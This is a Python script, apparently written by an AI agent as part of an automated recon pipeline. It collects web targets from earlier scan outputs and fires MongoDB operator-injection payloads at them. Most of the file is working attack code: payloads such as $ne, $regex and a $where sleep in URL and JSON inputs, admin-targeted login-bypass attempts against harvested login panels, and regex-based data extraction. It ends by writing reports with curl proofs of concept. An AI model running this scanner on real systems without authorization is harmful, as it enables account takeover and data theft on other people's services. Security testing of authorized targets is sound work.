#!/usr/bin/env python3
"""
Task 45: NoSQLMap - MongoDB/CouchDB Injection Testing - AI Brain
=================================================================

Tests for NoSQL injection vulnerabilities that are DIFFERENT from SQL injection:
- MongoDB $ne, $regex, $where operators
- Authentication bypass via operator injection
- JSON body and URL parameter injection

Author: Jules AI Agent
Mode: NOSQL - Different syntax from SQL
"""

import os
import sys
import json
import re
import hashlib
import logging
import argparse
import time
import string
import requests
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Optional, Set, Tuple, Any
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Disable SSL warnings for testing
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# =============================================================================
# DATA CLASSES
# =============================================================================

@dataclass
class NoSQLTarget:
    """Target for NoSQL injection testing."""
    url: str
    host: str
    method: str = 'GET'
    content_type: str = 'form'  # 'form' or 'json'
    params: Dict[str, str] = field(default_factory=dict)
    body: Optional[str] = None
    priority: int = 0
    source: str = ''


@dataclass
class NoSQLResult:
    """Result of NoSQL injection test."""
    url: str
    status: str  # vulnerable, possible, clean, error
    technique: Optional[str] = None  # operator, where, regex, timing
    payload: Optional[str] = None
    parameter: Optional[str] = None
    evidence: Optional[str] = None
    auth_bypass: bool = False
    error: Optional[str] = None


# =============================================================================
# PAYLOAD GENERATOR
# =============================================================================

class PayloadGenerator:
    """Generate NoSQL injection payloads."""
    
    # Operator injection payloads (MongoDB)
    OPERATOR_PAYLOADS = [
        ('$ne', {"$ne": ""}),
        ('$ne_null', {"$ne": None}),
        ('$gt', {"$gt": ""}),
        ('$gte', {"$gte": ""}),
        ('$lt', {"$lt": "zzzzzzzzzzz"}),
        ('$exists', {"$exists": True}),
        ('$regex_any', {"$regex": ".*"}),
        ('$regex_start', {"$regex": "^"}),
        ('$in', {"$in": ["admin", "root", "administrator", "test"]}),
        ('$or_bypass', {"$or": [{"": ""}, {"": ""}]}),
    ]
    
    # URL parameter injection payloads
    URL_PAYLOADS = [
        ('url_ne', '[$ne]='),
        ('url_gt', '[$gt]='),
        ('url_regex', '[$regex]=.*'),
        ('url_where', '[$where]=1'),
        ('url_exists', '[$exists]=true'),
        ('url_or', '[$or][0][a]=a'),
    ]
    
    # $where payloads (careful - can cause issues)
    WHERE_PAYLOADS = [
        ('where_true', "1; return true;"),
        ('where_sleep', "1; sleep(5000)"),
        ('where_func', "function() { return true; }"),
    ]
    
    @classmethod
    def get_operator_payloads(cls) -> List[Tuple[str, Any]]:
        """Get operator injection payloads."""
        return cls.OPERATOR_PAYLOADS
    
    @classmethod
    def get_url_payloads(cls) -> List[Tuple[str, str]]:
        """Get URL parameter payloads."""
        return cls.URL_PAYLOADS
    
    @classmethod
    def get_where_payloads(cls) -> List[Tuple[str, str]]:
        """Get $where payloads."""
        return cls.WHERE_PAYLOADS
    
    @classmethod
    def generate_auth_bypass_body(cls, username_field: str = 'username', 
                                   password_field: str = 'password') -> List[Dict]:
        """Generate auth bypass payloads for JSON body."""
        payloads = []
        
        # Standard operator bypass
        payloads.append({
            username_field: {"$ne": ""},
            password_field: {"$ne": ""}
        })
        
        # Target admin user
        payloads.append({
            username_field: "admin",
            password_field: {"$ne": ""}
        })
        
        # Regex bypass
        payloads.append({
            username_field: {"$regex": "^admin"},
            password_field: {"$ne": ""}
        })
        
        # Greater than bypass
        payloads.append({
            username_field: {"$gt": ""},
            password_field: {"$gt": ""}
        })
        
        return payloads
    
    @classmethod
    def generate_regex_extraction_payloads(cls, known: str = '') -> List[str]:
        """Generate payloads for character-by-character extraction."""
        payloads = []
        for char in string.ascii_letters + string.digits + '_-.@':
            payloads.append(f"^{re.escape(known)}{re.escape(char)}")
        return payloads


# =============================================================================
# TARGET COLLECTOR
# =============================================================================

class NoSQLTargetCollector:
    """Collect targets likely to have NoSQL backends."""
    
    def __init__(self, workspace: Path):
        self.workspace = workspace
        self.targets: List[NoSQLTarget] = []
        self.seen_urls: Set[str] = set()
    
    def collect_all(self) -> List[NoSQLTarget]:
        """Collect from all sources."""
        logger.info("=" * 60)
        logger.info("COLLECTING NoSQL INJECTION TARGETS")
        logger.info("=" * 60)
        
        # Priority 1: SQLi failures (might be NoSQL)
        self._collect_from_sqli_failures()
        
        # Priority 2: Known MongoDB hosts from Nuclei
        self._collect_from_nuclei()
        
        # Priority 3: API endpoints (commonly use NoSQL)
        self._collect_from_api_endpoints()
        
        # Priority 4: Login forms
        self._collect_login_forms()
        
        # Deduplicate and sort
        self.targets.sort(key=lambda t: t.priority, reverse=True)
        
        logger.info(f"\nTOTAL: {len(self.targets)} NoSQL targets collected")
        logger.info("=" * 60)
        
        return self.targets
    
    def _collect_from_sqli_failures(self):
        """Load URLs that failed SQLi testing (might be NoSQL)."""
        nosql_file = self.workspace / 'outputs' / 'sqli' / 'nosqlmap_targets.txt'
        if nosql_file.exists():
            count = 0
            with open(nosql_file, 'r') as f:
                for line in f:
                    url = line.strip()
                    if url and url.startswith('http') and url not in self.seen_urls:
                        self._add_target(url, 'sqli_failure', priority=90)
                        count += 1
            if count > 0:
                logger.info(f"  [sqli_failure] {count} targets from SQLi failures")
    
    def _collect_from_nuclei(self):
        """Load MongoDB hosts from Nuclei tech detection."""
        brain_file = self.workspace / 'outputs' / 'nuclei' / 'brain_knowledge.json'
        if brain_file.exists():
            try:
                with open(brain_file, 'r') as f:
                    data = json.load(f)
                
                tech_to_hosts = data.get('tech_to_hosts', {})
                
                nosql_techs = ['MongoDB', 'CouchDB', 'Redis', 'Elasticsearch']
                node_techs = ['Express', 'Node.js', 'Koa', 'Fastify']  # Often use MongoDB
                
                count = 0
                for tech in nosql_techs:
                    hosts = tech_to_hosts.get(tech, [])
                    for host in hosts:
                        # Create API endpoint URL
                        url = f"https://{host}/api/"
                        if url not in self.seen_urls:
                            self._add_target(url, f'nuclei_{tech}', priority=95)
                            count += 1
                
                # Node.js hosts are likely NoSQL
                for tech in node_techs:
                    hosts = tech_to_hosts.get(tech, [])
                    for host in hosts:
                        url = f"https://{host}/api/"
                        if url not in self.seen_urls:
                            self._add_target(url, f'nuclei_{tech}', priority=80)
                            count += 1
                
                if count > 0:
                    logger.info(f"  [nuclei] {count} targets from tech detection")
            except:
                pass
    
    def _collect_from_api_endpoints(self):
        """Collect API endpoints (commonly use NoSQL)."""
        api_files = [
            self.workspace / 'outputs' / 'api_endpoints_live.txt',
            self.workspace / 'outputs' / 'queue_api_endpoints_kiterunner.txt',
            self.workspace / 'outputs' / 'api_endpoints_from_openapi.txt',
        ]
        
        for api_file in api_files:
            if api_file.exists():
                count = 0
                with open(api_file, 'r') as f:
                    for line in f:
                        url = line.strip()
                        if url and url.startswith('http') and url not in self.seen_urls:
                            # Check if likely NoSQL
                            if self._is_nosql_likely(url):
                                self._add_target(url, 'api_endpoint', priority=75)
                                count += 1
                if count > 0:
                    logger.info(f"  [api] {count} targets from {api_file.name}")
    
    def _collect_login_forms(self):
        """Collect login endpoints for auth bypass testing."""
        login_file = self.workspace / 'outputs' / 'queue_login_panels_urls.txt'
        if login_file.exists():
            count = 0
            with open(login_file, 'r') as f:
                for line in f:
                    url = line.strip()
                    if url and url.startswith('http') and url not in self.seen_urls:
                        target = self._add_target(url, 'login_form', priority=85)
                        if target:
                            target.method = 'POST'
                            target.content_type = 'json'  # Try JSON first
                        count += 1
            if count > 0:
                logger.info(f"  [login] {count} login forms for auth bypass testing")
    
    def _is_nosql_likely(self, url: str) -> bool:
        """Check if URL is likely to use NoSQL backend."""
        url_lower = url.lower()
        
        # NoSQL indicators in URL
        nosql_indicators = [
            '/api/', '/v1/', '/v2/', '/v3/',
            '/graphql', '/query', '/search',
            '/json', '/rest/',
            '/mongo', '/nosql', '/db/',
            '/user', '/users', '/account',
            '/login', '/auth', '/session',
        ]
        
        return any(ind in url_lower for ind in nosql_indicators)
    
    def _add_target(self, url: str, source: str, priority: int) -> Optional[NoSQLTarget]:
        """Add target to list."""
        if url in self.seen_urls:
            return None
        
        self.seen_urls.add(url)
        
        parsed = urlparse(url)
        params = {}
        if parsed.query:
            for key, values in parse_qs(parsed.query).items():
                params[key] = values[0] if values else ''
        
        target = NoSQLTarget(
            url=url,
            host=parsed.netloc,
            params=params,
            priority=priority,
            source=source
        )
        
        self.targets.append(target)
        return target


# =============================================================================
# NOSQL SCANNER
# =============================================================================

class NoSQLScanner:
    """NoSQL injection scanner."""
    
    BATCH_TIME_LIMIT = 540  # 9 minutes
    REQUEST_TIMEOUT = 15
    
    def __init__(self, workspace: Path, output_dir: Path, temp_dir: Path):
        self.workspace = workspace
        self.output_dir = output_dir
        self.temp_dir = temp_dir
        
        # Create directories
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.temp_dir.mkdir(parents=True, exist_ok=True)
        (self.workspace / 'outputs' / 'vulnerabilities').mkdir(parents=True, exist_ok=True)
        
        # Session for requests
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) NoSQLMap-Test/1.0'
        
        # Results
        self.results: List[NoSQLResult] = []
        
        # Checkpoint
        self.checkpoint_file = self.temp_dir / 'checkpoint.json'
    
    def scan_all(self, targets: List[NoSQLTarget], resume: bool = False):
        """Scan all targets."""
        logger.info("=" * 60)
        logger.info("STARTING NoSQL INJECTION SCAN")
        logger.info("=" * 60)
        
        # Resume
        start_idx = 0
        if resume:
            checkpoint = self._load_checkpoint()
            start_idx = checkpoint.get('last_completed', 0)
            logger.info(f"[RESUME] Starting from index {start_idx}")
        
        total = len(targets)
        batch_start = time.time()
        
        for i, target in enumerate(targets[start_idx:], start=start_idx):
            # Time check
            elapsed = time.time() - batch_start
            if elapsed > self.BATCH_TIME_LIMIT:
                logger.info(f"[BATCH] Time limit reached at {i}/{total}")
                self._save_checkpoint(i)
                break
            
            logger.info(f"[{i+1}/{total}] Testing: {target.url[:70]}...")
            
            # Scan
            result = self._scan_single(target)
            self.results.append(result)
            
            # Report
            if result.status == 'vulnerable':
                logger.info(f"  [VULN!] NoSQL injection: {result.technique}")
                if result.auth_bypass:
                    logger.info(f"  [AUTH BYPASS!] Authentication bypass confirmed!")
                self._write_vuln_report(result)
            elif result.status == 'possible':
                logger.info(f"  [POSSIBLE] May be vulnerable: {result.technique}")
            
            # Checkpoint
            if (i + 1) % 10 == 0:
                self._save_checkpoint(i + 1)
        
        # Final save
        self._save_results()
        
        logger.info("\n" + "=" * 60)
        vuln_count = sum(1 for r in self.results if r.status == 'vulnerable')
        auth_bypass_count = sum(1 for r in self.results if r.auth_bypass)
        logger.info(f"SCAN COMPLETE: {len(self.results)} URLs tested")
        logger.info(f"  Vulnerable: {vuln_count}")
        logger.info(f"  Auth Bypass: {auth_bypass_count}")
        logger.info("=" * 60)
    
    def _scan_single(self, target: NoSQLTarget) -> NoSQLResult:
        """Scan single target for NoSQL injection."""
        result = NoSQLResult(url=target.url, status='clean')
        
        # Get baseline response
        baseline = self._get_baseline(target)
        if not baseline:
            result.status = 'error'
            result.error = 'Could not get baseline response'
            return result
        
        # Test 1: URL parameter injection
        url_result = self._test_url_params(target, baseline)
        if url_result:
            return url_result
        
        # Test 2: JSON body injection (if API endpoint)
        if target.content_type == 'json' or '/api/' in target.url.lower():
            json_result = self._test_json_body(target, baseline)
            if json_result:
                return json_result
        
        # Test 3: Auth bypass (if login endpoint)
        if 'login' in target.source or 'login' in target.url.lower():
            auth_result = self._test_auth_bypass(target)
            if auth_result:
                return auth_result
        
        return result
    
    def _get_baseline(self, target: NoSQLTarget) -> Optional[requests.Response]:
        """Get baseline response for comparison."""
        try:
            if target.method == 'POST':
                if target.content_type == 'json':
                    resp = self.session.post(
                        target.url,
                        json=target.params or {'test': 'test'},
                        timeout=self.REQUEST_TIMEOUT
                    )
                else:
                    resp = self.session.post(
                        target.url,
                        data=target.params or {'test': 'test'},
                        timeout=self.REQUEST_TIMEOUT
                    )
            else:
                resp = self.session.get(target.url, timeout=self.REQUEST_TIMEOUT)
            
            return resp
        except:
            return None
    
    def _test_url_params(self, target: NoSQLTarget, baseline: requests.Response) -> Optional[NoSQLResult]:
        """Test URL parameter injection."""
        parsed = urlparse(target.url)
        params = parse_qs(parsed.query)
        
        if not params:
            return None
        
        for param_name in params.keys():
            for payload_name, payload_suffix in PayloadGenerator.get_url_payloads():
                # Build injected URL
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{param_name}{payload_suffix}"
                
                try:
                    resp = self.session.get(test_url, timeout=self.REQUEST_TIMEOUT)
                    
                    # Compare responses
                    if self._is_different(baseline, resp):
                        return NoSQLResult(
                            url=target.url,
                            status='vulnerable',
                            technique=f'URL parameter injection ({payload_name})',
                            payload=f"{param_name}{payload_suffix}",
                            parameter=param_name,
                            evidence=f"Baseline: {len(baseline.content)} bytes, Injected: {len(resp.content)} bytes"
                        )
                except:
                    continue
        
        return None
    
    def _test_json_body(self, target: NoSQLTarget, baseline: requests.Response) -> Optional[NoSQLResult]:
        """Test JSON body injection."""
        # Detect possible parameter names
        param_names = list(target.params.keys()) if target.params else ['username', 'password', 'user', 'pass', 'id', 'query']
        
        for param_name in param_names:
            for payload_name, payload_value in PayloadGenerator.get_operator_payloads():
                # Build injected body
                test_body = {param_name: payload_value}
                
                try:
                    resp = self.session.post(
                        target.url,
                        json=test_body,
                        timeout=self.REQUEST_TIMEOUT
                    )
                    
                    # Compare responses
                    if self._is_different(baseline, resp):
                        # Check for positive indicators
                        if self._is_positive_indicator(resp):
                            return NoSQLResult(
                                url=target.url,
                                status='vulnerable',
                                technique=f'Operator injection ({payload_name})',
                                payload=json.dumps({param_name: payload_value}),
                                parameter=param_name,
                                evidence=f"Response changed: {resp.status_code}, {len(resp.content)} bytes"
                            )
                except:
                    continue
        
        return None
    
    def _test_auth_bypass(self, target: NoSQLTarget) -> Optional[NoSQLResult]:
        """Test authentication bypass."""
        # Common username/password field names
        field_combos = [
            ('username', 'password'),
            ('user', 'pass'),
            ('email', 'password'),
            ('login', 'password'),
            ('user', 'pwd'),
        ]
        
        for username_field, password_field in field_combos:
            payloads = PayloadGenerator.generate_auth_bypass_body(username_field, password_field)
            
            for payload in payloads:
                try:
                    # Try JSON
                    resp_json = self.session.post(
                        target.url,
                        json=payload,
                        timeout=self.REQUEST_TIMEOUT
                    )
                    
                    if self._is_auth_bypass_success(resp_json):
                        return NoSQLResult(
                            url=target.url,
                            status='vulnerable',
                            technique='Authentication bypass (operator injection)',
                            payload=json.dumps(payload),
                            auth_bypass=True,
                            evidence=f"Login success: {resp_json.status_code}"
                        )
                    
                    # Try form data
                    form_payload = {}
                    for key, value in payload.items():
                        if isinstance(value, dict):
                            # Convert {"$ne": ""} to username[$ne]=
                            for op, val in value.items():
                                form_payload[f"{key}[{op}]"] = val
                        else:
                            form_payload[key] = value
                    
                    resp_form = self.session.post(
                        target.url,
                        data=form_payload,
                        timeout=self.REQUEST_TIMEOUT
                    )
                    
                    if self._is_auth_bypass_success(resp_form):
                        return NoSQLResult(
                            url=target.url,
                            status='vulnerable',
                            technique='Authentication bypass (form injection)',
                            payload=str(form_payload),
                            auth_bypass=True,
                            evidence=f"Login success: {resp_form.status_code}"
                        )
                except:
                    continue
        
        return None
    
    def _is_different(self, baseline: requests.Response, response: requests.Response) -> bool:
        """Check if responses are significantly different."""
        # Status code change
        if baseline.status_code != response.status_code:
            return True
        
        # Length change (significant)
        len_diff = abs(len(baseline.content) - len(response.content))
        if len_diff > 100:
            return True
        
        # Error messages
        error_keywords = ['error', 'exception', 'invalid', 'syntax', 'operator']
        baseline_errors = sum(1 for kw in error_keywords if kw in baseline.text.lower())
        response_errors = sum(1 for kw in error_keywords if kw in response.text.lower())
        if response_errors > baseline_errors:
            return True
        
        return False
    
    def _is_positive_indicator(self, response: requests.Response) -> bool:
        """Check for positive injection indicators."""
        # Success status codes
        if response.status_code == 200:
            return True
        
        # Data in response
        if len(response.content) > 500:  # Got some data back
            return True
        
        return False
    
    def _is_auth_bypass_success(self, response: requests.Response) -> bool:
        """Check if authentication was bypassed."""
        # Redirect to dashboard/home
        if response.status_code in [200, 302]:
            success_indicators = [
                'dashboard', 'home', 'welcome', 'profile',
                'admin', 'logged', 'success', 'token',
                'session', 'cookie', 'jwt'
            ]
            text_lower = response.text.lower()
            if any(ind in text_lower for ind in success_indicators):
                return True
            
            # JWT/token in response
            if 'token' in response.text or '"jwt"' in response.text:
                return True
            
            # Set-Cookie header
            if 'set-cookie' in response.headers:
                cookie = response.headers.get('set-cookie', '').lower()
                if 'session' in cookie or 'auth' in cookie or 'token' in cookie:
                    return True
        
        return False
    
    def _write_vuln_report(self, result: NoSQLResult):
        """Write vulnerability report."""
        vuln_dir = self.workspace / 'outputs' / 'vulnerabilities'
        vuln_id = hashlib.md5(result.url.encode()).hexdigest()[:8]
        
        if result.auth_bypass:
            report_name = f"AUTH-BYPASS-NOSQL-{vuln_id}-CRITICAL.md"
        else:
            report_name = f"NOSQLI-{vuln_id}-CRITICAL.md"
        
        report_path = vuln_dir / report_name
        parsed = urlparse(result.url)
        
        report = f"""# NoSQL Injection: NOSQLI-{vuln_id}

## Summary
| Field | Value |
|-------|-------|
| **ID** | NOSQLI-{vuln_id} |
| **URL** | {result.url} |
| **Host** | {parsed.netloc} |
| **Technique** | {result.technique} |
| **Parameter** | {result.parameter or 'N/A'} |
| **Auth Bypass** | {'YES ⚠️' if result.auth_bypass else 'No'} |
| **Severity** | CRITICAL |
| **Discovered** | {datetime.now().isoformat()} |

## Payload
```json
{result.payload}
```

## Evidence
```
{result.evidence}
```

## Impact

{'**AUTHENTICATION BYPASS**: Attackers can login without valid credentials!' if result.auth_bypass else ''}

NoSQL injection allows:
- **Data extraction**: Read all documents from collections
- **Authentication bypass**: Login as any user
- **Data manipulation**: Modify or delete documents
- **DoS**: Expensive queries can crash database

## Proof of Concept

```bash
curl -X POST "{result.url}" \\
  -H "Content-Type: application/json" \\
  -d '{result.payload}'
```

## Recommendations

1. **Validate input types**: Reject objects when expecting strings
2. **Use strict mode** in Mongoose/ODM
3. **Sanitize operators**: Strip $-prefixed keys from user input
4. **Implement allowlists**: Only accept known parameter values
5. **Add rate limiting**: Prevent enumeration attacks

## References

- [OWASP NoSQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
- [PayloadsAllTheThings - NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
"""
        
        with open(report_path, 'w') as f:
            f.write(report)
        
        logger.info(f"  [REPORT] {report_name}")
    
    def _load_checkpoint(self) -> Dict:
        """Load checkpoint."""
        if self.checkpoint_file.exists():
            try:
                with open(self.checkpoint_file, 'r') as f:
                    return json.load(f)
            except:
                pass
        return {}
    
    def _save_checkpoint(self, last_completed: int):
        """Save checkpoint."""
        checkpoint = {
            'last_completed': last_completed,
            'timestamp': datetime.now().isoformat(),
        }
        with open(self.checkpoint_file, 'w') as f:
            json.dump(checkpoint, f, indent=2)
    
    def _save_results(self):
        """Save all results."""
        # Vulnerable URLs
        vuln_file = self.output_dir / 'nosql_vulnerable.txt'
        with open(vuln_file, 'w') as f:
            for r in self.results:
                if r.status == 'vulnerable':
                    f.write(f"{r.url}\n")
        
        # Auth bypass URLs
        auth_file = self.output_dir / 'auth_bypass_found.txt'
        with open(auth_file, 'w') as f:
            for r in self.results:
                if r.auth_bypass:
                    f.write(f"{r.url}\n")
        
        # Possible URLs
        poss_file = self.output_dir / 'nosql_possible.txt'
        with open(poss_file, 'w') as f:
            for r in self.results:
                if r.status == 'possible':
                    f.write(f"{r.url}\n")
        
        # Full JSON
        full_results = {
            'scan_time': datetime.now().isoformat(),
            'total_scanned': len(self.results),
            'vulnerable': sum(1 for r in self.results if r.status == 'vulnerable'),
            'auth_bypass': sum(1 for r in self.results if r.auth_bypass),
            'results': [
                {
                    'url': r.url,
                    'status': r.status,
                    'technique': r.technique,
                    'payload': r.payload,
                    'auth_bypass': r.auth_bypass,
                }
                for r in self.results
                if r.status in ['vulnerable', 'possible']
            ]
        }
        
        results_file = self.output_dir / 'nosql_full_results.json'
        with open(results_file, 'w') as f:
            json.dump(full_results, f, indent=2)
        
        logger.info(f"[SAVE] Results saved to {self.output_dir}")


# =============================================================================
# MAIN
# =============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="Task 45: NoSQLMap - MongoDB/CouchDB Injection Testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    
    parser.add_argument('--workspace', required=True, help='Path to workspace root')
    parser.add_argument('--output', default='outputs/nosql', help='Output directory')
    parser.add_argument('--temp', default='temp/task45', help='Temp directory')
    parser.add_argument('--resume', action='store_true', help='Resume from checkpoint')
    parser.add_argument('--max-targets', type=int, default=0, help='Max targets (0=all)')
    parser.add_argument('--api-only', action='store_true', help='Only test API endpoints')
    parser.add_argument('--url', help='Test specific URL')
    
    args = parser.parse_args()
    
    workspace = Path(args.workspace)
    output_dir = workspace / args.output
    temp_dir = workspace / args.temp
    
    # Collect or use specific URL
    if args.url:
        targets = [NoSQLTarget(
            url=args.url,
            host=urlparse(args.url).netloc,
            priority=100,
            source='cli'
        )]
    else:
        collector = NoSQLTargetCollector(workspace)
        targets = collector.collect_all()
    
    if not targets:
        logger.error("No NoSQL targets found!")
        sys.exit(1)
    
    # Filter API-only
    if args.api_only:
        targets = [t for t in targets if '/api/' in t.url.lower() or t.source == 'api_endpoint']
        logger.info(f"Filtered to {len(targets)} API endpoints")
    
    # Limit
    if args.max_targets > 0:
        targets = targets[:args.max_targets]
    
    # Scan
    scanner = NoSQLScanner(workspace, output_dir, temp_dir)
    scanner.scan_all(targets, resume=args.resume)


if __name__ == "__main__":
    main()
